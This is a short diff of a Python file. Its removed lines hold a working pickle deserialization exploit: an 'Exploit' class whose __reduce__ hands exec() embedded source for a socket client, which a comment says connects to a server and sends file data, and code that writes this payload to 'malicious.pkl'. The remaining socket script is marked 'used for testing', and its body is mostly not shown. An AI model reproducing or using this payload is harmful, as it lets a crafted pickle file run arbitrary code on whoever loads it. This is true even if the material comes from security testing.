@@ -1,7 +1,5 @@
-import pickle
+#used for testing
 
-#connects to server and sends .pkl file data
-src = """
 import socket
 import os
 
@@ -41,24 +39,3 @@ def start():
             print("Error:", e)
         
 start()
-"""
-
-class Exploit:
-    def __reduce__(self):
-        #needed to get exec() to use imported modules, uses dict as modules could not be reduced
-        bdict = __builtins__.__dict__.copy()
-
-        #__orig_import__ required by pyside6, made part of the builtins dict
-        if "__orig_import__" not in bdict:
-            bdict["__orig_import__"] = bdict.get("__import__")
-
-        #reduce exec w/ code and modules (as a dict) supplied as parameters
-        return (exec, (src, bdict,))
-
-if __name__ == "__main__":
-    payload = pickle.dumps(Exploit())
-
-    with open("malicious.pkl", "wb") as f:
-        f.write(payload)
-
-    print("Malicious pickle written to file.")
